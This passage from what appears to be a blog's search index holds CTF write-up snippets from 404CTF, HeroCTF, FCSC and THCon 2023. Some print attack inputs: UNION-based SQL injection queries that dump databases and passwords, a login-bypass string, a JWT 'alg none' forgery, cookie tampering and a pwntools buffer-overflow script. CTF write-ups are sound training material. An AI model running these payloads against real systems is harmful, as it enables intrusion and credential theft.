\"fWVtMXRjaXZfN3MzX2wxXzduMGRfdUAzbGZfMV83czNfM2MxcjR2QGx7RlRDNDA0\" | base64 -d gives us the same result as the previous decoded flag. We just need to use the rev tool on the terminal to recover the flag:The flag is 404CTF{l@v4r1c3_3s7_1_fl3@u_d0n7_1l_3s7_vict1me}." }, { "title": "CTFs | 404CTF_2023 | Web3 | L'Antiquaire, tête en l'air", "url": "/CTFs/404CTF_2023/Web3/L_Antiquaire_tete_en_l_air", "categories": "CTFs, 404CTF_2023, Web3", "tags": "Web3, BlockChain, Mementum, IPFS", "date": "2023-06-05 00:00:00 +0200", "snippet": "L’Antiquaire, tête en l’airRecover InformationIn this challenge, we have access to a memorendum.txt file. This file contains hex text. I tried decoding it using an online tool and find two links:What is IPFSThe URL https://shorturl.ac/mysecretpassword is a … You guessed what… And the interesting part is /ipfs/bafybeia5g2umnaq5x5bt5drt2jodpsvfiauv5mowjv6mu7q5tmqufmo47i/metadata.json.The InterPlanetary File System (IPFS) is a protocol, hypermedia and file sharing peer-to-peer network for storing and sharing data in a distributed file system. IPFS uses content-addressing to uniquely identify each file in a global namespace connecting IPFS hosts. IPFS can among others replace the location based hypermedia server protocols HTTP and HTTPS to distribute the World Wide Web.When looking how to access IPFS files, we get to this website where we can see how to access IPFS on the web:Access our first IPFSWe then go to the URL https://ipfs.io/ipfs/bafybeia5g2umnaq5x5bt5drt2jodpsvfiauv5mowjv6mu7q5tmqufmo47i/metadata.json and we found the JSON file:We are given another IPFS link ipfs://bafybeic6ea7qi5ctdp6s6msddd7hwuic3boumwknrirlakftr2yrgnfiga/mystere.png: If you don’t specify a file at the end of the IPFS address, you will see all the files shared on this IPFS.What is Sepolia?I first thought that this was the wallet of a certain user… But didn’t find anything. I then typed Sepolia on my browser and I found this:When I go to this website, I enter the ETH address 0x96C962235F42C687bC9354eDac6Dfa6EdE73C188:We can see that this blockchain has a contract. And when we head down to the Constructor Arguments section, we can see the flag:And we validate this challenge with 404CTF{M3M3_P45_13_73MP5_D3_53CH4UFF3r_QU3_C357_D3J4_F1N1!}" }, { "title": "CTFs | 404CTF_2023 | Web3 | Descente aux enfers", "url": "/CTFs/404CTF_2023/Web3/Descente_aux_enfers", "categories": "CTFs, 404CTF_2023, Web3", "tags": "Web3, BlockChain, Contract, Solidity", "date": "2023-06-05 00:00:00 +0200", "snippet": "La Folie du jeu : descente aux enfersIn this challenge, we are given a Solidity code (available here).In this code, we first initialise the contract using the constructor and by giving it the _start value:constructor(uint _start) { currentState = _start;}This value is not known but can be found. Then when the contract is initialized, we can use the guess function to try guessing the correct value and get the flag. As we can see in the bellow code, we need to give a calculation of the _start value a, c and m:function guess(uint _next) public returns (bool) { currentState = (a * currentState + c) % m; isSolved = (_next == currentState) || isSolved; return isSolved;}To find the _start value, I found the website Try Ethernal. This allows us to see all the newly created blocks and to get the one with the _start value given to the constructor.Now that we are all set, we can connect to the nc server to deploy the game. We get the JSON-RPC URL and the chain-id:Now, we can deploy the Jeu contract and head back to Try Ethernal. We will see the newly created block. When we click on it, we can see the Contract Creation Data:As we can see, at the bottom, the last line looks like 000000000000000000000000000000000000000000000000000000000c39b211. What comes after the 0s is the value given to the constructor. We now just have to send (a*0xc39b211+c)%m and we are done. To do so, I used a python code available here Note that you could also have done a JS code to do that ore used the website Remix EthereumThe flag we get by asking the nc server is 404CTF{r4Nd0Mn3ss_1S_NOt_s0_345y}" }, { "title": "CTFs | 404CTF_2023 | Web3 | Art", "url": "/CTFs/404CTF_2023/Web3/Art", "categories": "CTFs, 404CTF_2023, Web3", "tags": "Web3, BlockChain, NFT, OpenSea", "date": "2023-06-05 00:00:00 +0200", "snippet": "ArtIn this challenge, we need to fing the Ethereum address of the artist of an NFT called blanc avec des liserés blancs transversaux.First I tried looking some websites that host NFTs. I found OpenSea. I search the NFT name but didn’t find anything interesting… At least that’s what I thought at the beginning when I saw those NFTs:But if we take a closer look, and click on one of them, we notice that the collection name is indeed blanc avec de fins liserais blancs transversaux that is quite similar to blanc avec des liserés blancs transversaux:As we can see in the above screenshot, we can find the owner Antrios by clicking on its name:And that’s how we found its Ethereum address and so the flag is 404CTF{0xD7186D588Ed2AddF8b260d09B108100f264A64A9}." }, { "title": "CTFs | 404CTF_2023 | Web | Le Loup et le renard", "url": "/CTFs/404CTF_2023/Web/Le_Loup_et_le_renard", "categories": "CTFs, 404CTF_2023, Web", "tags": "Web, Source Code, Comments, JS", "date": "2023-06-05 00:00:00 +0200", "snippet": "Le Loup et le renardSecret in the source code ?This is a basic web challenge. We need to recover the flag by any means.First we arrive on the main page, we click on start and we have a form:Looking at the source code, we can see the credentials in clear text in the Java Script:We connect with the credentials admin:h5cf8gf2s5q7d.Be careful with cookiesOn the second part of the challenge, we have the title Cookies that give us a hint where to look for:As we can see, we have a cookie isAdmin with the value False. We just need to set the value to True and press CTFL+F5 to refresh the page:Handle redirectionsLooking again at the source code, we can see a redirection of the GET form:We go to the page /fable/partie-4-flag-final and we got the flag: Note that if you didn’t click on the link from the source code but pasted it in the url, you would have been redirected (this was the challenge). You could have bypassed the redirection by intercepting the request with Burp or by using the cURL command.So the flag is: 404CTF{N0_frOn1_3nD_auTh3nt1ficAti0n}" }, { "title": "CTFs | 404CTF_2023 | Web | La Vie Française", "url": "/CTFs/404CTF_2023/Web/La_Vie_Fran%C3%A7aise", "categories": "CTFs, 404CTF_2023, Web", "tags": "Web, SQLi", "date": "2023-06-05 00:00:00 +0200", "snippet": "La Vie FrançaiseWhen we arrive in this challenge, we access a web page where we can create an account by clicking on Postuler:Because I am someone really original, I created the user a with the password… a. We then can connect using this account and we arrive to the account page:At first I tried some SQLi on the previous forms without luck. I noticed that we have a uuid cookie and start looking about this on the web. Still nothing. I remembered of a challenge on WebGoat that used SQLi on cookies and when I tried XXX' OR True -- - I was now connected as jacquesrival:I tried using the XXX' OR True ORDER BY 3 -- - command to access user madeleineforestier that have administrator right, but even connected with this technique to this admin user this wasn’t enough. I tried a basic UNION based attack to recover information in the database and found that there was 3 columns using the command XXX' UNION Select '1','2',3 -- -: Note that only the param 1 and 2 are displayed so no need to set the value of the third parameterWe can now use the command XXX' UNION Select '1',group_concat(0x7c,schema_name,0x7c),3 from information_schema.schemata -- - to dump all the databases:We can see that the database we are looking for is named usersdb. We can now run the command XXX' UNION select group_concat(0x7c,TABLE_NAME,0x7c),group_concat(0x7c,TABLE_SCHEMA,0x7c),3 from INFORMATION_SCHEMA.TABLES where table_schema='usersdb'-- - to dump the tables:As we can see, for the database usersdb, there is only one table called users. We can now list all the column name of this table using the command XXX' UNION select group_concat(0x7c,COLUMN_NAME,0x7c),group_concat(0x7c,TABLE_NAME,0x7c),3 from INFORMATION_SCHEMA.COLUMNS where table_name='users' -- -:We can see that there is the username and password attribute that we may want to dump using the command XXX' UNION select group_concat(0x7c,username,0x7c),group_concat(0x7c,password,0x7c),3 from users -- -:We see a list of password… We can try connecting to the madeleineforestier account using the password fo2DVkgShz2pPJ and now when we go to the admin panel:We get the flag: 404CTF{B3w4Re_th3_d3STruct1v3s_Qu0tes}" }, { "title": "CTFs | 404CTF_2023 | Web | L'Académie du détail", "url": "/CTFs/404CTF_2023/Web/L_Academie_du_detail", "categories": "CTFs, 404CTF_2023, Web", "tags": "Web, JWT, Cookie", "date": "2023-06-05 00:00:00 +0200", "snippet": "L’Académie du détailIn this challenge, we arrive on a web page. We have login page available, and we can connect with any credentials we want (ex: a:a). We now have a tab called Liste des membres that appears at the top:But when we try to connect to it, we get this error:We try looking around and we can see a cookie called access-token:This cookie looks really like a JWT… When we put it on the website JWT.io, we can see that it is indeed a JWT:We try a basic attack on JWT that consist of, putting the alg attribute to none and this should bypass the signature (if this works). We can put the username to admin and we have : In case you are wondering, the encoded values of the JWT is only base64 encoded so we can decode it and encode whatever we want. We just can’t modify the signature part, hence the None algorithm chose. Pay attention to the case of the none. None won’t work if you try it with an upper-case N.We press CTRL+F5 to refresh the page and we get the flag:The flag is 404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35} " }, { "title": "CTFs | 404CTF_2023 | Web | Fuite en 1791", "url": "/CTFs/404CTF_2023/Web/Fuite_en_1791", "categories": "CTFs, 404CTF_2023, Web", "tags": "Web, URL, Expiry", "date": "2023-06-05 00:00:00 +0200", "snippet": "Fuite en 1791In this challenge, we arrive on a web page where we can’t access the file because of the link that is expired:Just adding a big expiry date after the signature will give us access to the file. This is because it will check that we set the expiry and signature values, then that the signature is valid (and it is, it’s just the expiry that is not). End finally, it will check the expiry:We just polluted the URL and got the flag: 404CTF{l4_p011uti0n_c_3st_m41}" }, { "title": "CTFs | 404CTF_2023 | ROSO_OSINT | Un Vol ?", "url": "/CTFs/404CTF_2023/ROSO_OSINT/Un_Vol", "categories": "CTFs, 404CTF_2023", "tags": "ROSO, OSINT", "date": "2023-06-05 00:00:00 +0200", "snippet": "Un Vol ?In this challenge, we need to find where Arsène Lupin, the gentleman thief, hide his treasure. For that, we have access to 6 images that can be found here.We can locate all images as follows: Image1: 48.865485101549766, 2.3948504115428997 Image2: 48.864976495955695, 2.3881579503565957 Image3: 48.86373217341456, 2.3989970552676754 Image4: 48.86234429017933, 2.385116265072168 Image5: 48.85726376619924, 2.3856400264315525 Image6: 48.85547532485293, 2.3891725859390527 I first tried to find a path that would get to each position found according to the direction where Lupin was heading. I didn’t notice anything special except that it’s like a circle shape. I tried to find the center of the 6 locations, but the Fontaine des Bois, Parcs et Jardins wasn’t the flag. I then tried to “finish” the circle shape of the path and obtain this:By zooming to the point near the center,we find the grave of Frédéric Chopin. The flag was 404CTF{tombe_frédéric_chopin}" }, { "title": "CTFs | 404CTF_2023 | ROSO_OSINT | Mentions gastronomiques", "url": "/CTFs/404CTF_2023/ROSO_OSINT/Mentions_gastronomiques", "categories": "CTFs, 404CTF_2023", "tags": "ROSO, OSINT", "date": "2023-06-05 00:00:00 +0200", "snippet": "Mentions gastronomiquesThis challenge requires us to recover the price of the meal that Margot Paquet ate. This was a bit tricky because there was an American lady that is named also Margot Paquet and that posted a picture of her meal that she ate for her wedding anniversary.After a lot of tries, I found another account on Instagram this time. It didn’t look really legitimate, it may be the good one this time:As stated on one of the images, she likes to eat Boeuf Bourguignon at the restaurant if it cost less than 15€:Her account was tagged by the Futurionix Instagram account. Looking at the images posted by this account, we can see that they ate in Paris near The Louvre museum:And they say that they are going to set their HQ near this location. Looking for restaurant near this location that are not expensive, we find the La Frégate. We can find pictures of the menu on google maps. And… a Boeuf Bourguignon at 13.5€!!! (We may have wasted time on the website that isn’t up to date):But the flag 404CTF{la_fregate_13.5} didn’t work. She may have eaten something with the Boeuf Bourguignon. Heading back to the Instagram account, we see that she ate a Tarte Tatin the day before the post of the picture:And the Boeuf Bourguignon picture was posted the 26th of April, one day after the Tarte Tatin post. So looking at the price of the Tarte Tatin we find two prices. One at 9€ and the other one at 10.5€:The final flag was (13.5+10.5=24): 404CTF{la_fregate_24.0}" }, { "title": "CTFs | 404CTF_2023 | ROSO_OSINT | Les OSINTables", "url": "/CTFs/404CTF_2023/ROSO_OSINT/Les_OSINTables", "categories": "CTFs, 404CTF_2023", "tags": "ROSO, OSINT", "date": "2023-06-05 00:00:00 +0200", "snippet": "Les OSINTablesIn this challenge, we need to find the address of Causette in the image:We can notice that there is the number 83 in roman number VXXXIII (V=50, X=10, I=1 =&gt; 50+3x10+3x1=83). There is also the name of the street Rue Victor Hugo.We can see on the envelope the beginning of the name of the city VE. At first I start looking at all Rue Victo Hugo listed here, but no city beginning with Ve had a Rue Victo Hugo. I then tried to type 83 Rue Victor Hugo Ve in Google Maps. I found 83 Rue Victor Hugo, Vergèze and flagged with:404CTF{83_rue_victor_hugo_vergèze}" }, { "title": "CTFs | 404CTF_2023 | ROSO_OSINT | Le Tour de France", "url": "/CTFs/404CTF_2023/ROSO_OSINT/Le_Tour_de_France", "categories": "CTFs, 404CTF_2023", "tags": "ROSO, OSINT", "date": "2023-06-05 00:00:00 +0200", "snippet": "Le Tour de FranceOn this chall we are given a picture of a road sign that we need to locate:A quick search on google map by typing E17 E21 besançon we find a link to E17 &amp; E21Heading to street view, we can find the signs:Looking at the url we can see 47.0150657,4.8676532 and we then need to truncate this to the hundreds, the flag is then 404CTF{47.01,4.86}" }, { "title": "CTFs | 404CTF_2023 | ROSO_OSINT | La Quête du sens", "url": "/CTFs/404CTF_2023/ROSO_OSINT/La_Quete_du_sens", "categories": "CTFs, 404CTF_2023", "tags": "ROSO, OSINT", "date": "2023-06-05 00:00:00 +0200", "snippet": "La Quête du sensFor this challenge, we are given this audio. We need to find the name of the text that this song comes from. We know that the name of the woman we are searching starts with Mar… Marie ? Margarette ? Marion ? Who knows ?This took a while to get done. I first try Deezer or similar tools to find the music without success. I then tried to Google poetesse morte francaise because this hole CTF is about French literature and found two results that could be the good ones:But Marguerite Yourcenar was Belgian-born, so I tried the other one Marceline Desbordes-Valmore. On her Wikipedia page, we can see a list of her poem that was set to music. The tune of the music didn’t seem really classic, so i tried from the end of the list until I get into the music of Julien Clerc called Les Séparés. It is said that Julien Clerc a ainsi mis en musique le poème « Les séparés », qui avait déjà été mis en musique par Henri Woollett, chanson intitulée Les Séparés dans l'album Julien, 1997 ;. So I search the music on YouTube and at this time watch of the music we hear the same tune of the piano that we had.The flag is then obviously: 404CTF{les_séparés}" }, { "title": "CTFs | 404CTF_2023 | ROSO_OSINT | L'âme d'un poète et le coeur d'une femme", "url": "/CTFs/404CTF_2023/ROSO_OSINT/L_ame_d_un_poete_et_le_coeur_d_une_femme", "categories": "CTFs, 404CTF_2023", "tags": "ROSO, OSINT", "date": "2023-06-05 00:00:00 +0200", "snippet": "L’âme d’un poète et le coeur d’une femmeThis OSINT challenge is split in 4 parts.L’âme d’un poète et le coeur d’une femme 1/4We are looking for a woman called Louise Colet. Looking at social networks, we find a Facebook user with this name. Looking at the profile, we can see in her favourite quotes the first flag : 404CTF{4_mon_ch3r_4mi_v1ctor}L’âme d’un poète et le coeur d’une femme 2/4During our first part of enumeration, I noticed that there was an Instagram account of Louise Colet just like the Facebook one. It has only one picture that contains a text explaining that a discord was created the 25th of may:The flag is: 404CTF{25_mai_colet_louise}L’âme d’un poète et le coeur d’une femme 3/4We are now looking for the discord invitation link. After a lot of time looking at the Instagram, Facebook accounts or on Twitter, The Way Back Machine, YouTube… I finally head back to GitHub and find a project called Salon-litteraire-de-Louise-Colet. That’s what we are looking for!!! At the bottom of the page there is the invitation to the discord server and the flag: 404CTF{B13nv3nue_d4ns_le_s4lon_l1tter4ir3_de_lou1se_C0l3t}.L’âme d’un poète et le coeur d’une femme 4/4When arriving on the discord we are told to enter in the chat le_petit_salon. Once this is done, we have a new channel that appears with the name we just typed.We need to find the year when the walker with white moustaches was in the Tuileries Garden (as specified in the above text. By using the query string in google \"promeneur inoccupé qui, sortant du jardin des Tuileries\", I found a webpage of Un_drame_dans_la_rue_de_Rivoli that had the same text and then found the year 1835.Then we are asked:I then used the query \"Les triomphes, le bruit,\" poeme in google and found the website of the poesie française that gives us the poem. We then concatenate everything and we get the answer: Pour nous, aimer et croire Au bonheur nous conduit. Coule une vie obscure Que le devoir remplit ; L'onde à l'ombre est plus pure, Rien ne trouble son lit.The final question, and not the easier one was:And after a lot of search on the internet, I found the website of gallica with the information:We could have been duped because they already saw each other before. The final answer was then: Gernesey_1857We then recover the flag in the last discord channel:404CTF{j3_su1s_ravie_d_av0ir_fait_v0tre_connaiss4nce}" }, { "title": "CTFs | HeroCTF2023 | Steganography | Subliminal", "url": "/CTFs/HeroCTF2023/Steganography/Subliminal", "categories": "CTFs, HeroCTF2023, Steganography", "tags": "CTF, HeroCTF, Steganography", "date": "2023-05-13 00:00:00 +0200", "snippet": "SubliminalIn this chall, we had to recover the subliminal image. We are given a video where we can see a square that appear on each frame. The video can be found here.At first I tried to create a program that recover the squares by searching the shape of a square on the video… But this didn’t work and was overcomplicated. I finally chose to just start at the first frame on the top left corner, save it in a folder named squares with its ID (first square ID=1, second ID=2…). I could find the squares because I knew they were 20*20 with the help of my “useless” previous code. It was easy because the squares appeared from the top left corner to the bottom right one and the position of the cube was 20 pixels to the right of the previous one. When the cube reached the end of the image, we went at the beginning of the next line. Then I just had to concatenate all the squares together. The EXIF of the video tells me that it has a frame of 1280*720. I just had to create an image of 1280*720 using all the squares of 20*20.You can find my code to recover the squares here and the one to generate the final image hereAnd the we got the flag:" }, { "title": "CTFs | HeroCTF2023 | Forensic | Heap", "url": "/CTFs/HeroCTF2023/Forensic/Heap", "categories": "CTFs, HeroCTF2023, Forensic", "tags": "CTF, HeroCTF, Forensic", "date": "2023-05-13 00:00:00 +0200", "snippet": "HeapIn this chall we are given a .hprof file (available here). HPROF is capable of presenting CPU usage, heap allocation statistics, and monitor contention profiles. In addition, it can also report complete heap dumps and states of all the monitors and threads in the Java virtual machine.After trying to install MTA on Eclipse without success to open the file… I found this website.It allowed us to read its content. When searching the word hero in the search bar of the Dominator Tree we can find the following result:Looking closely to what we just found out, we can find in com.hero.cryptedsecret.AESEncrypt @ 0x13323638 the variable message and the KEY:We see that it was an AESEncrypt. So I created a simple python program to decode it and we find:" }, { "title": "CTFs | HeroCTF2023 | Forensic | DevCorp", "url": "/CTFs/HeroCTF2023/Forensic/DevCorp", "categories": "CTFs, HeroCTF2023, Forensic", "tags": "CTF, HeroCTF, Forensic", "date": "2023-05-13 00:00:00 +0200", "snippet": "DevCorpIn this chall we are given a log file of all the requests made to the Wordpress web page. Here is the access.log file.I found this website that allowed me to look at the log file easily.Looking at the end of the log file, we can see that some kind of LFI is done to get the /etc/passwd file:We are searching for the CVE that the attacker is using and which sensitive file he exfiltrate. Looking at the duplicator_download parameter, we can find the backup file that we exported:Now that we have the file, we need to find the CVE. Searching for CVE duplicator_download Wordpress showed me wpscan page about this CVE:So the flag is obviously: Hero{CVE-2020-11738:/home/webuser/.ssh/id_rsa_backup}" }, { "title": "CTFs | FCSC2023 | Misc | Zéro pointé", "url": "/CTFs/FCSC2023/Misc/Zero_pointe", "categories": "CTFs, FCSC2023, Misc", "tags": "CTF, FCSC, Misc", "date": "2023-05-02 00:00:00 +0200", "snippet": "Zéro pointéThis chall is a bit of a reverse one. We had two files, one containing the following C code and the other with the compiled version of it:static void flag(int sig){ (void) sig; char flag[128]; int fd = open(\"flag.txt\", O_RDONLY); if (fd == -1) { perror(\"open\"); exit(EXIT_FAILURE); } int n = read(fd, flag, sizeof(flag)); if (n == -1) { perror(\"read\"); exit(EXIT_FAILURE); } flag[n] = 0; flag[strstr(flag, \"\\n\") - flag] = 0; if (close(fd) == -1) { perror(\"close\"); exit(EXIT_FAILURE); } printf(\"%s\\n\", flag); exit(EXIT_SUCCESS);}long read_long(){ long val; scanf(\"%ld\", &amp;val); return val;}int main(){ long a; long b; long c; if (signal(SIGFPE, flag) == SIG_ERR) { perror(\"signal\"); exit(EXIT_FAILURE); } a = read_long(); b = read_long(); c = b ? a / b : 0; printf(\"%ld\\n\", c); exit(EXIT_SUCCESS);}As we can see, the flag function is called if the SIGFPE signal is raised. To do so we would need to have a division by 0 for exemple.We have 2 input, a and b and then, the result of a/b is put in the c variable. But before doing the division, the program check if b is different of 0. If so, then the division is done if not, c=0. For that we needed to overwrite the values in a and b. Reading the man we see that LONG_MIN = -9223372036854775808 and LONG_MAX = +9223372036854775807.To get to 0 in b, we then need to put LONG_MIN - 1 in a and -1 in b. The input value for “a” is outside the range that can be represented by a long data type, and therefore leads to an overflow. As a result, the value of “a” becomes a very large positive number, and the value of “b” remains as -1, which causes a division by zero and triggers the flag() function." }, { "title": "CTFs | FCSC2023 | Intro | UID", "url": "/CTFs/FCSC2023/Intro/UID", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, BoF", "date": "2023-05-02 00:00:00 +0200", "snippet": "UIDFor this chall, we had a really simple compiled C code. This code, analysed with Ghidra looked like this:undefined8 main(void){ undefined local_38 [44]; __uid_t local_c; local_c = geteuid(); printf(\"username: \"); fflush(stdout); __isoc99_scanf(&amp;DAT_0010200f,local_38); if (local_c == 0) { system(\"cat flag.txt\"); } else { system(\"cat flop.txt\"); } return 0;}This basically just check if your user id is equal to 0 which is the root uid. The length of the string was 44 chars long. So we just need to input 44 chars, followed by a 0 to overwrite the value of the local_c variable:from pwn import *# offset to return addressoffset = 0x44+8# Start the process#p = process(\"./uid\")p = remote('challenges.france-cybersecurity-challenge.fr', 2100)p.recvuntil(\"username: \")# Craft the payloadpayload = b\"A\" * 44 # Fill the buffer until the end of local_38payload += p64(0) # Overwrite local_c with 0 (use p64 for 64-bit value)# Send the payloadp.sendline(payload)# Print the outputprint(p.recvall().decode()) Note that we added +8 at the offset so that we can overwrite the next address.This gives us:" }, { "title": "CTFs | FCSC2023 | Intro | Tri sélectif", "url": "/CTFs/FCSC2023/Intro/Tri_selectif", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, Math", "date": "2023-05-02 00:00:00 +0200", "snippet": "Tri sélectifThis chall requires us to sort an array. But we don’t see the array (can’t know every values). We only can check two values to know which one is the greater, change the position of two values and finally, check if the array is sorted.For that I used a basic selection sort algorithm:def trier(N): for i in range(N): min_index = i for j in range(i + 1, N): if comparer(j,min_index) == 1: min_index = j if min_index != i: echanger(i, min_index)We only had to complete the function in the client.py file given and run it:" }, { "title": "CTFs | FCSC2023 | Intro | T'es lent", "url": "/CTFs/FCSC2023/Intro/T_es_lent", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, Source Code", "date": "2023-05-02 00:00:00 +0200", "snippet": "T’es lentThis chall is basically just about reading the source code. When we look at the website, we don’t see much, but in the source code, we find:So we jumpt to the URL /stage-generateur-de-nom-de-challenges.html:And after jumping to the /admin-zithothiu8Yeng8iumeil5oFaeReezae.html, we get the flag:" }, { "title": "CTFs | FCSC2023 | Intro | SPAnosaurus", "url": "/CTFs/FCSC2023/Intro/SPAnosaurus", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, Signal", "date": "2023-05-02 00:00:00 +0200", "snippet": "SPAnosaurusIn this chall we had 3 files but only the image was useful. The above code makes us understand that this is a recursive function. The image of the signals, as said in the chall desciption, are the electrical consumsion of the computer when runing the above function.We notice that the more calculation is used when we are in the else statement. This only happen when the number is odd. So when we look at the graph, we can easily understand that the spikes apear when the odd calculation is done. The chall description tells us that the number 2727955623 is equal to 10100010100110010100110010100111 in binary. Which we can find on the graph:Knowing that, we can find the value of the admin trace:And so, because 2327373741 the flag is FCSC{2327373741}" }, { "title": "CTFs | FCSC2023 | Intro | ROT13", "url": "/CTFs/FCSC2023/Intro/ROT13", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, ROT13", "date": "2023-05-02 00:00:00 +0200", "snippet": "ROT13This chall is just a basic ROT13 that we can decrypt using dcode:" }, { "title": "CTFs | FCSC2023 | Intro | La_gazette_de_Windows", "url": "/CTFs/FCSC2023/Intro/La_gazette_de_Windows", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, Windows", "date": "2023-05-02 00:00:00 +0200", "snippet": "La gazette de WindowsFor this chall, we had a .evtx file. The .evtx file extension is used for files that contain event logs on Windows operating systems. These logs are recorded by the Event Viewer application and contain information about system events, including security, application, and system-related events. You can read a .evtx file using the Windows Event Viewer.You can read a .evtx file using the Windows Event Viewer. The Event Viewer is a built-in Windows tool that allows you to view, manage, and analyze events that are recorded in event logs. To open the Event Viewer:Press the Windows key + R to open the Run dialog box. Type eventvwr.msc and press Enter. In the Event Viewer window, select Action from the menu bar and choose Open Saved Log. Browse to the location of the .evtx file and select it.The one with the event ID of 4104 is the more interesting, we can find some powershell script in it:The interesting part is:$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D$s = \"\"for ($i = 0; $i -lt 72; $i++) { $s += [char]([int]$l[$i] -bxor $i)}Writing it in a .ps1 file, we print the s string and find the flag:" }, { "title": "CTFs | FCSC2023 | Intro | Dystylosaurus", "url": "/CTFs/FCSC2023/Intro/Dystylosaurus", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, SAL", "date": "2023-05-02 00:00:00 +0200", "snippet": "DystylosaurusIn this chall we just had a .sal file. After at least 10000000000 seraches on the web, we can finally know that the .sal extension is for:We find the tool Logic that could do the trick. We download it and open our .sal file:As we can see, the Channel 3 is pretty busy. We find an analyser:This analyser allows us to read a text that contains the flag:" }, { "title": "CTFs | FCSC2023 | Intro | Aaarg", "url": "/CTFs/FCSC2023/Intro/Aaarg", "categories": "CTFs, FCSC2023, Intro", "tags": "CTF, FCSC, Reverse", "date": "2023-05-02 00:00:00 +0200", "snippet": "AaargThis chall is a reverse chall. When looking at the executable in Ghydra, we can see what looks like a flag in the .rodata section:We then use r2. We use aaa to analyse the executable. We see a the address of .rodata using the iS command:We then seek for the address of .rodata we just found and we can find the flag:We can use the plx 20 command to read more and get the full flag:The full flag is FCSC{f9a38adace9dda3a9ae53e7aec180c5a73dbb7c364fe137fc6721d7997c54e8d}." }, { "title": "CTFs | FCSC2023 | Forensic | Ransomémoire", "url": "/CTFs/FCSC2023/Forensic/Ransomemoire", "categories": "CTFs, FCSC2023, Forensic", "tags": "CTF, FCSC, Forensic", "date": "2023-05-02 00:00:00 +0200", "snippet": "RansomémoireIn this chall of forensic, we are given a 2Gb memory dump of a windows machine. To analyse a memory dump, a geat tool is Volatility. In this chall, we coulnd’t use Volatility2 so we needed to use the version 3. I found a good blog about the conversion of the Volatility2 to 3 commands (there are only the main ones, but still interesting).We used the sessions command to find all the information we want (user, machine name and browser). The full command is volatility3/vol.py -f fcsc.dmp windows.sessions:We have here everything we need to craft the flag: FCSC{Admin:DESKTOP-PI234GP:brave}." }, { "title": "CTFs | THCon23 | Stega", "url": "/CTFs/THCon23/Stega", "categories": "CTFs, THcon23, Stega", "tags": "CTF, THCon23, Morse, Stega", "date": "2023-04-22 00:00:00 +0200", "snippet": "Hackbook BonusFor this chall, we needed to create an account on a website called Hackbook. When we access the website we can notice that there are a lot of posts. At first I tried to download the images but when I saved them, it was in WEBP format. So it was not possible to use classic steganography tools. I looked at the URL to find where the original image was stored. After a few attempts on several images, I try to look somewhere else and began to lose myself in the website, on the github of some user and on the Instagram of another. I didn’t miss any Rick Roll I believe. But then came back to the original website. There was an image that caught my attention at the beginning.Getting the flagThe interesting image was this one:I noticed that at the bottom there is a Morse code but… DVR don’t seem to be a flag… I put the image on Aperisolve and found an interesting Morse string at the top: The Morse code wasn’t DVR but ZSTEG (my mistake :) ). It was in fact --.. ... - . --. (I missed a space and some double dash). So obviously we should use ZstegBut I believe that TUTITTATAETUTETSTTTUTUTTATTTIAAAIUETR isn’t a correct flag… I then found in the Zsteg output some interesting string:We can find the flag thanks to the dcode website:We don’t forget to add the curly bracket and… Voilà THCON23{R4ND0MST3GANOGRAPHY}" }, { "title": "CTFs | THCon23 | Hackbook", "url": "/CTFs/THCon23/Hackbook", "categories": "CTFs, THcon23, Hackbook", "tags": "CTF, THCon23, Hackbook, Web", "date": "2023-04-22 00:00:00 +0200", "snippet": "HackbookThis chall is split in 4 parts (Hackbook#1 to Hackbook#4). There is a Steganography chall that is called Hackbook Bonus #2 you can find it hereHackbook #1Here is the challenge formulation:When going to the website, we can create an account on it. When we do so, we can go to the Help Center section and we can see the following:As we can see, we can access post information, and also user information. We are looking for the account of Léa and as we can see it’s the account with the ID=1:Looking at her profile, we can see that she loves her cat grisouille and that she lives in Toulouse,31. We can create a wordlist with the following information to try cracking the hash found via the API of the website and…Voilà:But to connect, we need her email address and we only have her pseudo… But looking at the images where she is tagged we can find her email. We suppose that she has a Gmail account because it begins with a g and most people have a Gmail account for personal business:So now we have the combo lea.leroux.gribouille@gmail.com : gribouille31. As you can see, we can connect to the account:And we find the flag in the Notes section:Hackbook Bonus #1Here is the formulation for the first bonus challenge:So we search in the source code of every page and…On the Help Center page:Hackbook #2Here is the formulation for the second challenge:As we can see, Kevin is the user with ID=2:We can find in the list of his posts, the URL of his blog:Where we can find his email kevin@keke.com:The website doesn’t look like there is much… But he talks about some login page… Does he have one ?:Let’s head to the /login page:We can see a basic login page. First thing that comes to my mind is SQLi. So y try the payload admin' or True # and …:We head back to the main page and find his password:We connect with the credentials kevin@keke.com : lock_and_key:And we get the flag:Hackbook #3Here is the formulation for the third challenge:Our target (Alexia our “girlfriend”) is the user with the ID=3 and we find her email directly:Looking at the blog information, we can see that Kevin is watching Netflix on the account of Alexia:And we can see that Alexia uses the same password on different platforms:So if we can have the password of the Netflix account, we may be able to connect as Alexia. And we can kindly ask her when connected as Kevin:And now, using alexia@girlfriend.com : j@dOreN3tfl1x to connect to the hackbook:And the flag is in the notes:" }, { "title": "CTFs | THCon23 | Disk_Analysis", "url": "/CTFs/THCon23/Disk_Analysis", "categories": "CTFs, THcon23, Disk_Analysis", "tags": "CTF, THCon23, Disk_Analysis, testdisk", "date": "2023-04-22 00:00:00 +0200", "snippet": "Disk AnalysisFor this challenge, we have a zip file containing a ReadMe.md and a suspectDisk.raw. The ReadMe.md file tells us:#ContextOur informations are that a flag is hidden on this disk. However, we 